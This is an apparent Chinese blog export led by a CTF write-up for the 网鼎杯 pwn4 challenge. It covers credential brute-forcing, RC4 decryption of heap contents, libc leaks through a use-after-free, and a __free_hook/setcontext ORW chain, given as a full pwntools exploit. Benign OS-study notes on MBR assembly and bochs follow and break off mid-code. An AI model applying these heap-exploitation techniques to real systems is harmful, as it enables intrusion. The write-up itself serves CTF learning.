[{"title":"网鼎杯pwn4复现","url":"/2024/10/31/%E7%BD%91%E9%BC%8E%E6%9D%AFpwn4%E5%A4%8D%E7%8E%B0/","content":"网鼎杯pwn4\n下载附件\n\n​\t中午发的题，一看数据库心想没学过去看那道webpwn，没学过，rust，没学过。事已至此，先吃饭吧。\n​\t吃完饭后还是看了一眼附件，花了20分钟分析觉得能打，密码爆破+加密+堆orw，想到了之前打过的silverwolf，就是打tcache_struct+setcontext来绕过堆orw。最后还是卡在加密，找gpt要了两次脚本都没过，现在来看实在是gpt差距。最后争不动去上数电课了，整场比赛就出了一道300分的pwn签到，最战犯的一集\n爆破账号密码​\t\n​\t看到用户名检测后续想到爆破，第一步和绕过strncmp的原理相同，他只会比较你输入的字符串长度范围内的两个字符串有没有差异，所以我们可以逐字节爆破。但是之后他还是会检查两个字符串长度，所以我们需要爆破完整的账号。\n​\t一般账号密码只会使用键盘上有的字符，可以预先准备一个爆破字典，我的方法是直接爆破ascii 33-126范围的字符。可以直接用man命令查看ascii码对应的字符\nmain ascii\n\n爆破脚本：\nfor i in range(10):    for i in range(33, 127):        success(&quot;try----&gt;&quot;+chr(i))        p.sendafter(&quot;Input your username:&quot;,username+chr(i)+&#x27;\\0&#x27;+&#x27;\\n&#x27;)        p.recvline()        recv = p.recvline()        if b&quot;Invalid username!&quot; in recv and b&quot;Invalid username length!&quot; not in recv:            continue        else:            success(&quot;find----&gt;&quot;+chr(i))            username += chr(i)            success(&quot;username----&gt;&quot;+username)            break    if b&quot;Username correct!&quot; in recv:        break\n\n对于密码的爆破也同理\np.sendlineafter(&quot;Input your username:&quot;,username)for i in range(10):    for j in range(33, 127):        p.sendlineafter(b&#x27;Input your password:\\n&#x27;, passwd+chr(j))        recv = p.recvline()        if b&#x27;Invalid password!&#x27; in recv:            p.sendlineafter(&quot;Input your username:&quot;,username)            continue        elif b&#x27;Invalid password length!&#x27; in recv:            success(&quot;find----&gt;&quot;+chr(j))            passwd += chr(j)            success(&quot;passwd----&gt;&quot;+passwd)            p.sendlineafter(&quot;Input your username:&quot;,username)            break    if b&quot;Password correct!&quot; in recv:        break&#x27;&#x27;&#x27;\n\n这个程序如果账号密码不正确会直接退出，还会贴心的回到输入账号密码的入口，所以我们不必每次都p.remote()和p.close()。但是每次爆破密码不成功都要重新输入一次账户。\n最后爆破出来用户名是”4dmin”，密码是”985da4f8cb37zkj”。\n在本地调试的时候记得自己添加一个password和username文件测试爆破脚本是否有效。\n存储内容加密\n​\t之后就是经典的增删改查，在释放堆块时有uaf漏洞。但是他在每次存入和修改数据时都会先把数据输入，再对数据长度的内容加密，每次查看数据时再把数据取出来解密，显示数据内容再加密放回去\n​\t\n\n\n​\t加密的过程看了一遍之后不能说是完全看懂，至少也是一窍不通。不仅是泄露释放堆块后的main_arena偏移还是堆地址，还是填入伪造地址都要绕过加密。\n​\t但是从最后的异或和解密来看可能加密和解密过程都是相同的，一开始我想能否通过重复填入加密后的内容得到加密前的内容，不用写解密脚本了？程序遵守填入&#x2F;更改就加密，取回解密展示再加密放回，所以除了写解密脚本没有别的办法泄露内容。\n​\t只好把代码扔给了ai生成如下解密脚本（没有ai的世界是多么寸步难行……或许是我太捞了\ndef sub_1152(state_array, output, length):    v5 = 0    v6 = 0    for i in range(length):        v5 = (v5 + 1) % 256        v6 = (v6 + state_array[v5]) % 256                # Swap in state array        state_array[v5], state_array[v6] = state_array[v6], state_array[v5]                # Encrypt the data        output[i] ^= state_array[(state_array[v5] + state_array[v6]) % 256]def encrypt(plaintext):    key = b&#x27;s4cur1ty_p4ssw0rd&#x27;    state_array = bytearray(256)    # Initialize the state array using sub_F98    sub_F98(state_array)        # Prepare output buffer    output_data = bytearray(plaintext)        # Encrypt using sub_1152    sub_1152(state_array, output_data, len(plaintext))        return bytes(output_data)def decrypt(encrypted_data):    key = b&#x27;s4cur1ty_p4ssw0rd&#x27;    state_array = bytearray(256)    # Initialize the state array using sub_F98    sub_F98(state_array)        # Prepare output buffer    decrypted_data = bytearray(encrypted_data)        # Decrypt using sub_1152    sub_1152(state_array, decrypted_data, len(encrypted_data))        return bytes(decrypted_data)\n\n但是我的解密脚本似乎有问题，当输入比较长时，就会发生这种情况：\n\n后半段完全变成乱码了:-( 比赛的时候急得我上蹿下跳，完全忘了队里的re手\nhttps://blog.csdn.net/Mr_Fmnwon/article/details/143355594\n事后复现嫖走了这位师傅的解密函数: -)  \n\n好耶。\n原来事rc4加密。这rc4加密真rc4啊。\n泄露堆地址与libc地址​\tglibc版本2.27，引入了tcache还没有其他什么检测，甚至可以通过直接覆盖fd的方式请出任意已知位置的堆块，几乎是板子题。但程序沙箱禁用了exeve和exeveat\n\n对于这个版本的堆orw，我想到了之前做过的ciscn2021 silverwolf，同样也是打tcache利用setcontext，但是那个题申请堆块大小有限，所以必须通过控制tcache_struct拼接两个堆块来填入足够长度的orw链。比赛的时候我局限了，照着silverwolf的脚本就是一顿复制粘贴，但实际上这个题对于堆块大小没有限制，完全可以不用打tcache_struct。\n在通过账号密码之后用pwndbg看一眼堆会发现乱得一，这是因为沙箱的原因\n\n我们首先通过tcache泄露堆地址，通过uaf泄露地址时内存中的确是原地址，但程序执行时先会取出解密再展示，所以我们还是要把取出来的数据走一遍解密\nadd(0, 0x70, b&#x27;aaaa&#x27;)delete(0)show(0)p.recvuntil(b&#x27;[0,&#x27;)encry1 = p.recv(8)success(&quot;encry1----&gt;&quot;+hex(u64(encry1)))heap = rc4((encry1))success(&quot;heap----&gt;&quot;+hex(u64(heap)))heap_base = u64(heap)+0x55b4ebaab000-0x55b4ebaabc70success(&quot;heap_base----&gt;&quot;+hex(heap_base))\n\n然后我们需要填满tcache，再释放一个相同大小的堆块放入unsortedbin泄露libc基址。这个堆块需要大于0x70，不然会放入fastbin，同时为了防止沙箱残留的堆块造成影响，所以我选择了0x150大小的堆块。\nfor i in range(9):    add(i, 0x240, b&#x27;a&#x27;)for i in range(8):    delete(i)show(7)p.recvuntil(b&#x27;[7,&#x27;)encry2 = p.recv(8)main_arena = u64(rc4(encry2)) -0x96success(&quot;main_arena----&gt;&quot;+hex(main_arena))libc_base = main_arena+ 0x7f14b1604000 - 0x7f14b19efc0asuccess(&quot;libc_base----&gt;&quot;+hex(libc_base))\n\nsetcontext &amp; orw\n如图是附件给的动态链接库里setcontext函数的样子，在setcontext+53的位置开始可以通过rdi的偏移设置各个寄存器，而在free一个堆块时会将rdi指向该堆块的位置。先把预备free的堆块上设置setcontext的frame，其中rsp设置为free_hook+8，然后把（setcontext+53）+（orw）写到free_hook上，这样就可以直接返回到orw\n&#x27;&#x27;&#x27;frame = SigreturnFrame()frame.rdi = free_hook+0x100frame.rsi = 0frame.rdx = 0frame.rsp = free_hook+0x8frame.rip = libc_base+libc.sym[&#x27;open&#x27;]&#x27;&#x27;&#x27;frame = b&#x27;&#x27;frame = frame.ljust(0x68, b&#x27;\\x00&#x27;)+p64(free_hook+0x108)+p64(0) #rdi rsiframe = frame.ljust(0x88, b&#x27;\\x00&#x27;)+p64(0) #rdxframe = frame.ljust(0xa0, b&#x27;\\x00&#x27;)+p64(free_hook+8)+p64(libc_base+libc.sym[&#x27;open&#x27;])#rsp rcxadd(0, 0x160, bytes(frame))rdi = libc_base + 0x2164frsi = libc_base + 0x23a6ardx = libc_base + 0x1b96setcontext = libc_base+libc.sym[&#x27;setcontext&#x27;]payload_orw = p64(rdi)+p64(3)+p64(rsi)+p64(heap_base+0x1100)+p64(rdx)+p64(0x100)+p64(libc_base+libc.sym[&#x27;read&#x27;])payload_orw += p64(rdi)+p64(1)+p64(libc_base+libc.sym[&#x27;write&#x27;])payload_orw = payload_orw.ljust(0x100, b&#x27;\\x00&#x27;)+b&#x27;/flag\\x00&#x27;edit(6, rc4(p64(free_hook)))add(7, 0x150, b&#x27;a&#x27;)add(7, 0x150, rc4(p64(setcontext+53)+payload_orw))gdb.attach(p)delete(0)p.interactive()\n\n我不直接用SigretureFrame()的原因是本地调试时会出错，所以人工对着偏移设置的各个寄存器:-(。记得在exp脚本开头设置面向操作系统和架构\ncontext(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)\n\n记得预备free的堆块，就是设置setcontext上下文的那个堆块要申请的大一点(&gt;0xa0)，不然会导致后面寄存器写不上去的情况，同时也可以方便一点之后的orw，提前把open的寄存器设置好，当然求稳也可以写到orw里。\n总expfrom pwn import *from LibcSearcher3 import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)filename = &#x27;pwn&#x27;def exec_fmt(pad):    p = process(&#x27;./&#x27;+filename)    p.sendlineafter(&quot;Enter your name: &quot;, pad)    p.recvuntil(b&#x27;Hello, &#x27;)    return p.recv()&#x27;&#x27;&#x27;fmt = FmtStr(exec_fmt)print(&quot;offset ===&gt; &quot;, fmt.offset)&#x27;&#x27;&#x27;IP = &#x27;&#x27;debug = 0if debug:    p = remote(&#x27;0192d6893cc27e60b227aa9ef34bad8f.t1dx.dg03.ciihw.cn&#x27;, 44732)else:    p = process(&#x27;./&#x27;+filename)elf = ELF(&#x27;./&#x27;+filename)def dbg():    gdb.attach(p)ubuntu16 = [&#x27;~/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;, &#x27;~/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&#x27;]ubuntu18 = [&#x27;~/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;, &#x27;~/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6&#x27;]libc = ELF(&#x27;/home/marcel/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6&#x27;)def leak(something):    rc = u64(p.recv(6).ljust(8,b&quot;\\x00&quot;))    success(something+&quot;----&gt;&quot;+hex(rc))    return rcdef leak_fmt(something):    rc = int(p.recv(14),16)    success(something+&quot;----&gt;&quot;+hex(rc))    return rcdef add(idx, size, content):    p.sendlineafter(&quot;&gt; \\n&quot;, &#x27;1&#x27;)    p.sendlineafter(&quot;Input the key: &quot;, str(idx))    p.sendlineafter(&quot;Input the value size: &quot;, str(size-1))    p.sendlineafter(&quot;Input the value: &quot;, content)def show(idx):    p.sendlineafter(&quot;&gt; \\n&quot;, &#x27;2&#x27;)    p.sendlineafter(&quot;Input the key: &quot;, str(idx))def delete(idx):    p.sendlineafter(&quot;&gt; \\n&quot;, &#x27;3&#x27;)    p.sendlineafter(&quot;Input the key: &quot;, str(idx))def edit(idx, content):    p.sendlineafter(&quot;&gt; \\n&quot;, &#x27;4&#x27;)    p.sendlineafter(&quot;Input the key: &quot;, str(idx))    p.sendlineafter(&quot;Input the value: &quot;, content)def ksa(dest, password, length):    # 初始化 S-box    S_box = list(range(256))    password_1 = [0] * 256        # 根据密钥生成 password_1    for i in range(256):        password_1[i] = ord(password[i % length])        # 执行密钥调度算法    j = 0    for i in range(256):        j = (j + S_box[i] + password_1[i]) % 256        S_box[i], S_box[j] = S_box[j], S_box[i]        return S_boxdef prga(S_box, data, length):    i = 0    j = 0        for k in range(length):        i = (i + 1) % 256        j = (j + S_box[i]) % 256                # 交换 S-box 中的元素        S_box[i], S_box[j] = S_box[j], S_box[i]                # 生成密钥流字节并与数据异或        key_stream_byte = S_box[(S_box[i] + S_box[j]) % 256]        data[k] ^= key_stream_byte        return datadef rc4(data):    password = &#x27;s4cur1ty_p4ssw0rd&#x27;    # 转换 data 为 bytearray    data = bytearray(data.encode() if isinstance(data, str) else data)        # 获取数据长度    length = len(data)        # 初始化 S-box    S_box = ksa(None, password, len(password))        # 加密/解密数据    prga(S_box, data, length)        return bytes(data)username = &#x27;4dm1n&#x27;passwd = &#x27;985da4f8cb37zkj&#x27;p.sendlineafter(&quot;Input your username:&quot;, username)p.sendlineafter(&quot;Input your password:&quot;, passwd)add(0, 0x70, b&#x27;aaaa&#x27;)delete(0)show(0)p.recvuntil(b&#x27;[0,&#x27;)encry1 = p.recv(8)success(&quot;encry1----&gt;&quot;+hex(u64(encry1)))heap = rc4((encry1))success(&quot;heap----&gt;&quot;+hex(u64(heap)))heap_base = u64(heap)+0x55b4ebaab000-0x55b4ebaabc70success(&quot;heap_base----&gt;&quot;+hex(heap_base))for i in range(9):    add(i, 0x150, b&#x27;a&#x27;)#tcache*7+unsorted*1+seperate*1for i in range(8):    delete(i)show(7)p.recvuntil(b&#x27;[7,&#x27;)encry2 = p.recv(8)main_arena = u64(rc4(encry2)) -0x96success(&quot;main_arena----&gt;&quot;+hex(main_arena))libc_base = main_arena+ 0x7f14b1604000 - 0x7f14b19efc0asuccess(&quot;libc_base----&gt;&quot;+hex(libc_base))free_hook = libc_base+libc.sym[&#x27;__free_hook&#x27;]&#x27;&#x27;&#x27;frame = SigreturnFrame()frame.rdi = free_hook+0x100frame.rsi = 0frame.rdx = 0frame.rsp = free_hook+0x8frame.rip = libc_base+libc.sym[&#x27;open&#x27;]&#x27;&#x27;&#x27;frame = b&#x27;&#x27;frame = frame.ljust(0x68, b&#x27;\\x00&#x27;)+p64(free_hook+0x108)+p64(0) #rdi rsiframe = frame.ljust(0x88, b&#x27;\\x00&#x27;)+p64(0) #rdxframe = frame.ljust(0xa0, b&#x27;\\x00&#x27;)+p64(free_hook+8)+p64(libc_base+libc.sym[&#x27;open&#x27;])#rsp rcxadd(0, 0x160, bytes(frame))rdi = libc_base + 0x2164frsi = libc_base + 0x23a6ardx = libc_base + 0x1b96setcontext = libc_base+libc.sym[&#x27;setcontext&#x27;]payload_orw = p64(rdi)+p64(3)+p64(rsi)+p64(heap_base+0x1100)+p64(rdx)+p64(0x100)+p64(libc_base+libc.sym[&#x27;read&#x27;])payload_orw += p64(rdi)+p64(1)+p64(libc_base+libc.sym[&#x27;write&#x27;])payload_orw = payload_orw.ljust(0x100, b&#x27;\\x00&#x27;)+b&#x27;/flag\\x00&#x27;edit(6, rc4(p64(free_hook)))add(7, 0x150, b&#x27;a&#x27;)add(7, 0x150, rc4(p64(setcontext+53)+payload_orw))gdb.attach(p)delete(0)p.interactive()\n\nReferhttps://blog.csdn.net/Mr_Fmnwon/article/details/143355594\n","categories":["pwn","heap","setcontext"],"tags":["pwn","blasting","heap","setcontext"]},{"title":"c艹pwn学习","url":"/2024/11/01/c%E8%89%B9pwn%E5%AD%A6%E4%B9%A0/","content":"C++pwn学习​\t不能再碌碌无为了！对于c++pwn真是一窍不通……比赛也只有保龄的份，在这里逐步更新c++pwn的学习。\nReferdig into C++ pwn - Hexo\n","categories":["pwn","c++"],"tags":["pwn","c++","to_do_list"]},{"title":"操作系统啥啥啥的","url":"/2024/11/01/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%95%A5%E5%95%A5%E5%95%A5%E7%9A%84/","content":"操作系统咕咕咕咕南大的jyy操作系统课&amp;操作系统真相还原:-)，9月份开始念拖到现在，抽出空闲时间尽量做吧。\nBIOS &amp; 中断实现MBRBIOS是计算机上第一个运行的软件，由只读存储器ROM加载。程序通电后cs:ip寄存器强制初始化为0xf000:0xfff0，就是地址0xffff0，这段代码会跳转到0xfeb50处，就是BIOS代码真正开始的地方。BIOS会检查外设信息、初始化硬件、引导加载程序。它的最后一项工作就是校验启动盘里0盘0道1扇区的内容，就是去找主引导记录MBR，确认上去末尾两个字节分别是0x55和0xaa后就表明该扇区是可加载的程序。\nMBR用来引导操作系统，在被确认可引导后会被加载到物理地址0x7c00的位置（为什么是这个位置是个历史遗留问题），然后BIOS跳转到这个位置。mbr是干嘛的？\n\n然后书上给了个实例汇编代码……用来实现mbr……这应该不是传统意义上的mbr，毕竟他的作用就是清屏、定位光标、打印一行字符串，但是模拟了BIOS启动到加载mbr、运行mbr的过程\nsection MBR vstart=0x7c00    mov ax, cs    mov ds, ax    mov es, ax    mov ss, ax    mov fs, ax ;cs为0，为各个寄存器中转赋值    mov sp, 0x7c00    mov ax, 0x600 ;ah功能号=6，向上或向下滚动行，即为清屏，al=0即为全部行    mov bx, 0x700 ;    mov cx, 0x0 ;    mov dx, 0x184f ; 上面三个是参数    int 0x10 ;显示和视频中断    mov ah, 3 ; 获取光标位置    mov bh, 0 ; 在第一页获取    int 0x10    mov ax, message    mov bp, ax ;bp是段偏移寄存器，无法mov直接数，所以用ax暂存字符串地址        mov cx, 16 ;串长度    mov ax, 0x1301 ;ah=13，显示字符及属性，al=1，显示字符串，光标跟随移动    mov bx, 0x2 ; bh=0，显示页，bl=2，黑底绿字    int 0x10    jmp $ ;$代表当前地址，即无限循环    message: db &#x27;Hello, OS world!&#x27;    times 510-($-$$) db 0 ;填充0，使程序长度为512字节，-($-$$)表示当前地址减去该section的起始地址    db 0x55, 0xaa ;最后两个字节为可加载标志，0x55, 0xaa，一共512字节\n\n注意的点不能把直接数赋给cs:ip寄存器，可以通过其他寄存器暂存的方法间接赋予。不然就会这样：\nmbr.S:22: error: invalid combination of opcode and operands\n\nax寄存器高8位ah用来作为调用功能号存储，低8位al用来传递数据或参数\nmov ax, 0x600 ;ah功能号=6，向上或向下滚动行，即为清屏，al=0即为全部行\n\n$代表当前指令地址，$$代表当前section起始地址，两个相减就是本扇区已用空间\ntimes 510-($-$$) db 0 ;填充0，使程序长度为512字节，-($-$$)表示当前地址减去该section的起始地址\n\n通过nasm编译出二进制文件\nnasm -o mbr.bin mbr.S\n\n放ida里看一眼，嘿嘿\n\n在偏移0x21的地方是汇编指令“mov     ax, 7C33h”，对应源码中的“mov ax, message”，而起始虚拟地址为0x7c00的条件下message的偏移确为0x7c33，所以程序确是以0x7c00为起始编址\n不能直接.&#x2F;mbr.bin运行（蠢比），需要BIOS引导\n\n这么来看必须要在我的wsl上搞一个虚拟环境了。。。\n————————————————————————————————————————————————————————————\n安装bochs报错解决跟着书上的步骤安装bochs，再make install步骤中可能会报错：\ngtk_enh_dbg_osdep.cc:20:10: fatal error: gtk/gtk.h: No such file or directory   20 | #include &lt;gtk/gtk.h&gt;      |          ^~~~~~~~~~~compilation terminated.make[1]: *** [Makefile:104: gtk_enh_dbg_osdep.o] Error 1make[1]: Leaving directory &#x27;/home/marcel/OS/bochs-2.6.2/gui&#x27;make: *** [Makefile:322: gui/libgui.a] Error 2\n\n解决办法：\nsudo apt-get updatesudo apt-get install libgtk-3-devsudo apt-get install libcurl4-openssl-devsudo apt-get install libgtk2.0-dev\n\n然后重新把包删掉重新解压，make clean不是很干净\n启动bochs加载bochhsrc.disk还会遇到这样的报错：\nBochs is exiting with the following message:[      ] bochsrc.disk:7: &#x27;keyboard_mapping&#x27; is deprecated - use &#x27;keyboard&#x27; option instead.\n\n将bochsrc.disk中的keyboard_mapping字段改为keyboard\n然后过了艰难的一段调bochs环境，最终我原封不动的下了和书上相同的bochs版本，原封不动的把配置流程走了一遍，但是并没有“没有启动盘”的报错，有点心虚。。。\n首先创建一个虚拟硬盘作为我们的启动盘：\nbin/bximage -hd -mode=&quot;flat&quot; -size=60 -q hd60M.img\n\n然后使用磁盘操作命令dd将我们的二进制文件mbr.bin数据输入到这个虚拟硬盘里：\n\ndd if=/home/marcel/OS/mbr.bin of=/home/marcel/OS/bochs/hd60M.img bs=512 count=1 conv=notrunc\n\n​\t启动bochs，6，回车，c（和gdb一样的命令）启动\n\n打印出来了一行绿色的字，从初始的回显可以看出起始地址在0xffff0，然后跳转到0xfe05b的位置，就是BIOS的起始地址，然后BIOS巴拉巴拉……最终检测到0盘0道1扇区末尾有魔数0x55aa，直接跳转到0x7c00的位置，执行了我们自己写的mbr。\n再小小改进一下……\nsection MBR vstart=0x7c00    mov ax, cs    mov ds, ax    mov es, ax    mov ss, ax    mov fs, ax    mov sp, 0x7c00 ;设置段寄存器    mov ax, 0x600 ;ah功能号=6，向上或向下滚动行，al=0即为全部行，即为清屏    mov bx, 0x700 ;    mov cx, 0x0 ;    mov dx, 0x184f ; 上面三个是参数    int 0x10 ;显示和视频中断    mov ah, 3 ; 获取光标位置    mov bh, 0 ; 在第一页获取    int 0x10    mov ax, message    mov bp, ax ;bp是段偏移寄存器，无法mov直接数，所以用ax暂存字符串地址        mov cx, 8 ;循环8次    mov ax, 0x1301 ;ah=13，显示字符及属性，al=1，显示字符串，光标跟随移动    mov bx, 0x0 ; bh=0，显示页    mov dl, 0 ;从0列开始    mov dh, 0 ;从0行开始puts_8:    push cx ;保存cx    mov cx, 0x10 ;每次打印16字符    int 0x10    inc bl ;每次循环属性+1，打印出彩色    inc dh ;行+1    pop cx    loop puts_8    jmp $ ;$代表当前地址，即无限循环    message: db &#x27;Hello, OS world!&#x27;    times 510-($-$$) db 0 ;填充0，使程序长度为512字节，-($-$$)表示当前地址减去该section的起始地址    db 0x55, 0xaa ;最后两个字节为可加载标志，0x55, 0xaa，一共512字节\n\n\nHello, OS world!\n始于足下。\nmbr硬件♂交互一点点汇编&amp;硬件补充然后的第三章作者用两小节补充了汇编相关的内容。之前有一点点pwn基础，少说也读过（心虚）csapp，所以像看小说一样很轻松的就看完了，包括实模式、地址分段、指令执行、寄存器、栈与相关操作、寻址方式与jmp、call的调用方式、flags寄存器这些内容。巩固了一些知识，也的确有额外的收获：\n在ida反汇编的时候，常常能看到这样的语句：\n\n在之前我只是直接理解为他会无条件跳转到0x187a这个位置，short是什么？\n相似的还有这样：\njmp\t\tnear loc_15E3\n\nnear和short都是表明，在汇编成机器语言时这里是相对跳转而不是直接跳转，比如上面那个jmp short 187a在机器码中就是“EB 27”，eb表示相对近转移，27就是操作数，实际上等于 当前位置与0x187a之差-当前指令长度，near也是同理，他们在机器码中都是基于当前位置（在与目标位置同段，或者说相对比较近的情况下）进行相对跳转，你看机器码中的操作数并没有出现7a18，都不是直接跳转。\n书中将几种跳转方式分为相对短转移、相对近转移、间接绝对近转移、直接绝对远转移、间接绝对远转移，相对与绝对表示目标是与当前位置的偏移还是实际地址，直接间接表示目标数是直接数还是寄存器&#x2F;内存引用。\n这些东西知道了就是知道了，和之前不知道好像没区别。实际上有什么用呢？\n想起了之前暑假的时候考研学长和我说的话，的确如此……\n为了解决cpu与各个硬件之间的不协调，就有了IO接口这一中间层，帮助cpu处理硬件，就像收作业的小组长。书中说到看不到声卡和显卡是因为他们集成在主板里面了，就是集成声卡集成显卡。那时候还是2013年，ai和3A游戏在我们眼里还是很遥远的词汇，想来真是感慨。书中说03年时作者看过一个特大的显卡，就像主板插在显卡上一样，这是不是当年的独显呢？\n硬件那些不多说了，看过就是看过。这个学期我甚至没报上数电实验（悲\n显存MBR之前的实践都是通过中断让BIOS给我们打印字符，而且中断向量表只存在于实模式中，那么如何不通过中断打印呢？\n我们直接对显存下手。\n显存文本模式下内存地址为0xb8000，我们往上面写东西就会落到显存中，显存上有了数据就会往屏幕上面打印，某种意义上来说我们就可以不通过中断调用BIOS打印字符了\nSECTION MBR vstart=0x7c00    mov ax, cs    mov ds, ax    mov es, ax    mov ss, ax    mov fs, ax    mov sp, 0x7c00    mov ax, 0xb800     mov gs, ax ;设置gs为段寄存器，位置为0xb8000，即为显存文本模式的内存地址    mov ax, 0x600 ;ah功能号=6，向上或向下滚动行，al=0即为全部行，即为清屏    mov bx, 0x700 ;    mov cx, 0x0 ;    mov dx, 0x184f ; 上面三个是参数    int 0x10 ;显示和视频中断    mov byte [gs:0x00], &#x27;H&#x27;     mov byte [gs:0x01], 0xa4    mov byte [gs:0x02], &#x27;e&#x27;    mov byte [gs:0x03], 0xa4    mov byte [gs:0x04], &#x27;l&#x27;    mov byte [gs:0x05], 0xa4    mov byte [gs:0x06], &#x27;l&#x27;    mov byte [gs:0x07], 0xa4        mov byte [gs:0x08], &#x27;o&#x27;    mov byte [gs:0x09], 0xa4    mov byte [gs:0x0a], &#x27; &#x27;    mov byte [gs:0x0b], 0xa4        mov byte [gs:0x0c], &#x27;O&#x27;    mov byte [gs:0x0d], 0xa4    mov byte [gs:0x0e], &#x27;S&#x27;    mov byte [gs:0x0f], 0xa4 ;每个打印的字符占2个字节大小，低字节是字符ascii码，高字节是颜色和显示模式。0xa4代表绿色背景闪烁，前景色为红色(RGB)    jmp $    times 510-($-$$) db 0 ;填充0，使程序长度为512字节，-($-$$)表示当前地址减去该section的起始地址    db 0x55, 0xaa ;最后两个字节为可加载标志，0x55, 0xaa，一共512字节\n\n与中断实现相比，这一版的代码改变了两处：一处是我们把gs定为显存的段寄存器，把它设为0xb800，实际上[gs:0xab]就是0xb80ab；另一处把通过中断打印的内容改成往显存文本模式内存中写字符显示的数据，就是通过gs寄存器做段寄存器寻址实现的\n然后重新编译，写入虚拟硬盘，启动bochs，看看效果如何：\n\n左上角有一个很小的“hello OS”\n实际上它在不断闪烁。\nmbr之can can need 硬盘到现在好像都没做什么实事，但是大的药来了——用mbr读取硬盘内容。\n这里说的硬盘是机械硬盘，就是那个有盘子，用磁头读写的硬盘。\n【【硬核科普】固态硬盘为什么比机械硬盘快？快在哪里？快的这些地方影响什么体验？】https://www.bilibili.com/video/BV1dE411k7tU?vd_source=1f48e47dc1ff12763001a0341edf7ebd\n如果你不知道什么是机械硬盘，什么是固态硬盘，这个科普视频讲的非常好。2024的今天机械硬盘已经被淘汰，你我的电脑里大多装的都是固态硬盘，如果上网搜索“双十一硬盘选购”，那么结果也是固态硬盘占绝大多数。会装机的室友向我展示了他的固态与机械硬盘，固态就是小小的食指大小一条，机械硬盘有我手掌大。\n”固态比机械快？“\n”机械完全不能用。“\n这本书还是2013年成书，让人不得不感慨时代的变迁，仅仅过去了十年。\n之前我们模拟的hd60M.img就是虚拟机械硬盘。\n只不过还是很有意思的，不通过中断的方式直接和硬件交互的就像不断探索底层，从c到汇编到机械码，从函数调用到中断到硬件交互，就像剥洋葱，如果你愿意一层一层一层一层……\n之前提到过硬件与cpu交互需要媒介，就是所谓的IO接口。硬盘的IO接口就是硬盘控制器，我们读写硬盘就是读写硬盘控制器的端口，而IO接口上的端口就是他的寄存器，换句话说我们读写硬盘、查看硬盘的状态之类的就是和硬盘控制器上的寄存器打交道。\n有很多的硬盘端口……但是我们只用其中的一部分：\n\n端口作用在读写时不同，同一个端口在读和写时可能有不同的作用。不用在意通道啥的，就是主盘接口和从盘接口，接下来都一样的\ndata寄存器就是管理数据的，可出也可进，既然是闸门必须大，只他一个可以存两个字节大小，其他全是8位寄存器。写硬盘时数据源源不断的送到此端口，硬盘控制器发现里面有内容了就往扇区上写，读硬盘时就是不断读这个寄存器\nerror读时记录失败信息，写时存储额外参数\nsector count存储待读写的扇区数量\n接下来三个端口（也是寄存器）用来存储读取或写入的目标硬盘地址。当然可以通过柱面-磁头-扇区的方式来存储硬盘地址，这种存储方式叫做CHS，但是这样mbr又会说看不懂思密达，那就直接简单粗暴的把每个扇区12345地编号，这样就称作LBA。这里的LBA用28位存储一个扇区的地址，low mid high分别对应地址中的低位中位高位，3*8&#x3D;24不是我还有4位呢？\ndevice出场，他的作用比较杂，首先作为一个8位寄存器它的低4位补齐LBA存储的最后一部分，其次第4位用来表示主盘（0）还是从盘（1），第6位表示LBA模式还是CHS模式，5位和7位都置0\nstatus寄存器保存各种状态，第0位是ERR位，它是1就去找error寄存器，第3位表示数据是否准备好，第6位表示硬盘是否就绪，第7位表示硬盘是否繁忙。\n\ncommand寄存器可以识别很多指令，这是其中三个：\n\n0xec，硬盘识别\n0x20，读硬盘\n0x30，写硬盘\n\n接下来……我们只用到这三个\n实际上为了方便cpu直接从内存中拿数据其他什么都不用管，已经有了MBA（直接存储器）这种东西，甚至还有更牛逼的IO处理器，但是他们都是单独的硬件，我们的目的是手搓模拟。那就上吧！\n%include &quot;boot.inc&quot;   ; 预处理命令，类似与c语言的头文件，给了如下两个宏; LOADER_BASE_ADDR equ 0x900 ; LOADER_START_SECTOR equ 0x2SECTION MBR vstart=0x7c00    mov ax, cs    mov ds, ax    mov es, ax    mov ss, ax    mov fs, ax    mov sp, 0x7c00 ;设置段寄存器    mov ax, 0xb800    mov gs, ax ; gs等下我们薅过来做段寄存器，这里先把它初始化    mov ax, 0x600 ;ah功能号=6，向上或向下滚动行，al=0即为全部行，即为清屏    mov bx, 0x700 ;    mov cx, 0x0 ;    mov dx, 0x184f ; 上面三个是参数    int 0x10 ;显示和视频中断    mov byte [gs:0x00], &#x27;H&#x27;    mov byte [gs:0x01], 0xa4    mov byte [gs:0x02], &#x27;e&#x27;    mov byte [gs:0x03], 0xa4    mov byte [gs:0x04], &#x27;l&#x27;    mov byte [gs:0x05], 0xa4    mov byte [gs:0x06], &#x27;l&#x27;    mov byte [gs:0x07], 0xa4    mov byte [gs:0x08], &#x27;o&#x27;    mov byte [gs:0x09], 0xa4    mov byte [gs:0x0a], &#x27; &#x27;    mov byte [gs:0x0b], 0xa4        mov byte [gs:0x0c], &#x27;O&#x27;    mov byte [gs:0x0d], 0xa4    mov byte [gs:0x0e], &#x27;S&#x27;    mov byte [gs:0x0f], 0xa4    mov eax, LOADER_START_SECTOR ;扇区起始地址，就是第二扇区    mov bx, LOADER_BASE_ADDR ;写入地址    mov cx, 1 ;待读入扇区数    call rd_disk_m_16 ;读取16位硬盘    jmp LOADER_BASE_ADDR ;完成读取后跳转到; 读取硬盘第n个扇区rd_disk_m_16:    mov esi, eax    mov di, cx ;备份寄存器，从此di就是待读入扇区数; 设置读取扇区数    mov dx, 0x1f2    mov al, cl    out dx, al ;将待读入扇区数写入0x1f2寄存器，即为sector count    mov eax, esi ;恢复ax,即为扇区起始地址;存入LBA地址    mov dx, 0x1f3 ;lowLBA    out dx, al    mov cl, 8    shr eax, cl ;右移，取中位LBA    mov dx, 0x1f4 ;midLBA    out dx, al    shr eax, cl    mov dx, 0x1f5 ;highLBA    out dx, al    shr eax, cl    and al, 0x0f ;取最后四位    or al, 0xe0 ;设置LBA模式1110    mov dx, 0x1f6 ;device    out dx, al    mov 